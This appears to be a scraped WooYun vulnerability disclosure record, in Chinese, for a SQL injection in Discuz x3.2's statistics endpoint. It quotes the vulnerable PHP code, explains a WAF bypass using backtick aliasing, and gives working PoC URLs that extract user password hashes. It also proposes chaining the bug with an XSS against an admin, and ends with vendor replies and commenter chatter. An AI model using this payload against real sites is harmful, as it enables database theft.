{"id": 49177, "wybug_id": "wooyun-2014-074970", "wybug_title": "Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）", "wybug_corp": "Discuz!", "wybug_author": "phith0n", "wybug_date": "2014-09-04 10:15", "wybug_open_date": "2014-12-03 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向公众公开  简要描述： 前台非盲注，只需要配合一个xss，就能消除鸡肋了。信pandas，得永生，紧抱doggy哥大腿！ 详细说明：  /source/include/misc/misc_stat.php 46行：\nif(!empty($_GET['xml'])) {\t$xaxis = '';\t$graph = array();\t$count = 1;\t$begin = dgmdate($beginunixstr, 'Ymd');\t$end = dgmdate($endunixstr, 'Ymd');\t$field = '*';\tif(!empty($_GET['merge'])) {\t\tif(empty($_GET['types'])) {\t\t\t$_GET['types'] = array_merge($cols['login'], $cols['forum'], $cols['tgroup'], $cols['home'], $cols['space']);\t\t}\t\t$field = 'daytime,`'.implode('`+`', $_GET['types']).'` AS statistic';\t\t$type = 'statistic';\t}\tforeach(C::t('common_stat')->fetch_all($begin, $end, $field) as $value) {\t\t$xaxis .= \"<value xid='$count'>\".substr($value['daytime'], 4, 4).\"</value>\";\t\tif($type == 'all') {\t\t\tforeach ($cols as $ck => $cvs) {\t\t\t\tif($ck == 'login') {\t\t\t\t\t$graph['login'] .= \"<value xid='$count'>$value[login]</value>\";\t\t\t\t\t$graph['register'] .= \"<value xid='$count'>$value[register]</value>\";\t\t\t\t} else {\t\t\t\t\t$num = 0;\t\t\t\t\tforeach ($cvs as $cvk) {\t\t\t\t\t\t$num = $value[$cvk] + $num;\t\t\t\t\t}\t\t\t\t\t$graph[$ck] .= \"<value xid='$count'>\".$num.\"</value>\";\t\t\t\t}\t\t\t}\t\t} else {\t\t\t//var_dump($value);exit;\t\t\tif(empty($_GET['types']) || !empty($_GET['merge'])) {\t\t\t\t$graph[$type] .= \"<value xid='$count'>\".$value[$type].\"</value>\";\t\t\t} else {\t\t\t\tforeach($_GET['types'] as $t) {\t\t\t\t\t$graph[$t] .= \"<value xid='$count'>\".$value[$t].\"</value>\";\t\t\t\t}\t\t\t}\t\t}\t\t$count++;\t}\t$xml = '';\t$xml .= '<'.\"?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\";\t$xml .= '<chart><xaxis>';\t$xml .= $xaxis;\t$xml .= \"</xaxis><graphs>\";\t$count = 0;\tforeach ($graph as $key => $value) {\t\t$xml .= \"<graph gid='$count' title='\".diconv(lang('spacecp', \"do_stat_$key\"), CHARSET, 'utf8').\"'>\";\t\t$xml .= $value;\t\t$xml .= '</graph>';\t\t$count++;\t}\t$xml .= '</graphs></chart>';\t@header(\"Expires: -1\");\t@header(\"Cache-Control: no-store, private, post-check=0, pre-check=0, max-age=0\", FALSE);\t@header(\"Pragma: no-cache\");\t@header(\"Content-type: application/xml; charset=utf-8\");\techo $xml;\texit();}\n见这一句：\n$field = 'daytime,`'.implode('`+`', $_GET['types']).'` AS statistic';\n将$_GET['type']数组直接用`+`分割，并没有过滤。因为位置在$field的地方，并不在单引号中，所以不用引入单引号，也无需考虑addslashes。现在遇到另一个问题，怎么绕过discuz3.2的WAF？不绕过也没法出数据。我们先看看输出点在何处：\nhttp://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=x\n\n\n也就是说我们可以控制的部分有很多。且不看全局防注入源码，黑盒试一下我发现一旦出现'、(就会拦截，而且注释符（#、--）也会拦截。括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。\nSELECT daytime,`aaa` AS statistic FROM common_stat WHERE daytime>=20140805 AND daytime<=20140904 ORDER BY daytime\n我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。\n\n执行会提示Unknown column 'daytime' in 'field list'。所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：\n\n大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。那么，有的同学再问，sql语句后半部分\n` AS statistic FROM common_stat WHERE daytime>=20140805 AND daytime<=20140904 ORDER BY daytime\n没有注释符怎么处理？这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。所以，先构造一个url：\nhttp://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20daytime%20from%20pre_common_statuser,pre_ucenter_members%20as\n\n\n可以看到已经出数据了。但发现出来的数据只有4位。原因是，在源码中使用了substr取了daytime的第4到8位：\n$xaxis .= \"<value xid='$count'>\".substr($value['daytime'], 4, 4).\"</value>\";\n我们看下有没其他的输出点。于是找到了一个：\nif(empty($_GET['types']) || !empty($_GET['merge'])) {\t\t\t\t$graph[$type] .= \"<value xid='$count'>\".$value[$type].\"</value>\";\t\t\t}\n这个if语句，其中$type为statistic，而将$value[$type]的值输出了。所以，我只需将password取个别名叫statistic，就能输出password了。那么，最后的poc就是：\nhttp://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as\n本地测试效果：\n\n这个漏洞鸡肋之处在于，虽然它是一个前台的注入（无需登录后台），但是却需要管理员权限。所以，利用方法就是找到一个前台xss，管理员（前台管理）访问以后用javascript获得访问到的页面内容，即可获得注入出的信息。使鸡肋漏洞变得不再鸡肋。或者利用某些浏览器的跨域漏洞，也能注入。   漏洞证明：  \nhttp://target/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-04 10:29 厂商回复： 感谢您提出的问题，我们会尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 10:17 |    \t\t切克脑 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | z..)\t\t \n  前排广告出租    \n     2014-09-04 10:29 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  前排围观    \n     2014-09-04 10:30 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  要结合XSS估计猜到什么点！膜拜洞主！    \n     2014-09-04 10:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  草，信哥得永生？    \n     2014-09-04 10:40 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  还在前排。。。。    \n     2014-09-04 10:49 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  doggy哥来了    \n     2014-09-04 14:55 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  前排围观新的DZ漏洞    \n     2014-09-04 18:11 |    \t\tcold \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 生命不息，折腾不止。)\t\t \n  前排围观新的DZ漏洞    \n     2014-09-04 18:44 |    \t\tkav \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  前排围观新的DZ漏洞    \n     2014-09-04 19:16 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  前排围观新的DZ漏洞    \n     2014-09-04 20:04 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @pandas 去，不是你，是我狗哥~~    \n     2014-09-05 08:05 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  mark    \n     2014-09-05 09:34 |    \t\t落月 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 落月，关注网络安全；关注黑帽劫持；)\t\t \n  dz也这么不安全了。    \n     2014-09-05 23:03 |    \t\t西西 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 走过路过不会错过！)\t\t \n  前排围观新的DZ漏洞    \n     2014-09-07 23:31 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  马    \n     2014-09-08 08:30 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  你是DZ派来的救兵吗？    \n     2014-09-09 16:11 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  http://www.discuz.net/thread-3598151-1-1.html 官方又在偷偷更新不写日志？    \n     2014-09-09 23:33 |    \t\tSuner \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 洞次打次)\t\t \n  @Hmily 一有人提交DZ相关的，H大就会出现...    \n     2014-09-10 22:12 |    \t\tMr.Lonely \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力成为一个有用的人。)\t\t \n  前排围观新的DZ漏洞     \n     2014-09-12 22:51 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  卧槽三个$$$  最近dz好不安全啊    \n     2014-09-13 22:45 |    \t\tMckBug \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | 无影响厂商忽略)\t\t \n  前排围观新的DZ漏洞    \n     2014-09-24 21:06 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  只能爆最后一个用户么 不能指定ID啊    \n     2014-10-19 13:37 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @Matt 你懂个jb    \n     2014-10-19 13:38 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @Matt ……>.<    \n     2014-10-24 16:05 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  哥，我试了下，为啥我这反引号不自动闭合啊？用你的URL测试，还是提示SQL异常啊，我的mysql是5.6.21版本。 linux平台。    \n     2014-10-24 16:08 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @nzk1912 版本高了就不行了    \n     2014-10-24 16:14 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  @phith0n mysql还是dz?我看了dz的修复方法，我已经把PHP代码改回和你的一样了~    \n     2014-10-24 16:17 |    \t\t风花雪月 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:44        | []+[]|[]-[][][][][]%[][]|[]\\[]%[][]|[]\\[...)\t\t \n  只限于可查看数据统计的用户权限以上，感觉有种蛋蛋的忧伤    \n     2014-10-24 16:19 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @nzk1912 mysql版本不能太高    \n     2014-10-24 16:24 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  @phith0n 额~好吧~貌似x3.2的洞不多啊~不知道是代码质量好~还是找洞没动力啊    \n     2014-10-24 16:30 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  @phith0n 突然发现，这个是  $$$ 啊~告诉我下，大约多少奖金啊？（可私信），我膜拜下    \n     2014-12-03 23:15 |    \t\tMurk Emissary \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:14        | 低调做人 低调行事)\t\t \n  @nzk1912 一万多奖金吧    \n     2014-12-04 15:07 |    \t\t落月 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 落月，关注网络安全；关注黑帽劫持；)\t\t \n  是够鸡肋的，前台管理员还真不好找、    \n     2015-06-06 10:00 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  @phith0n 不能指定id。。怎么破 QAQ    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}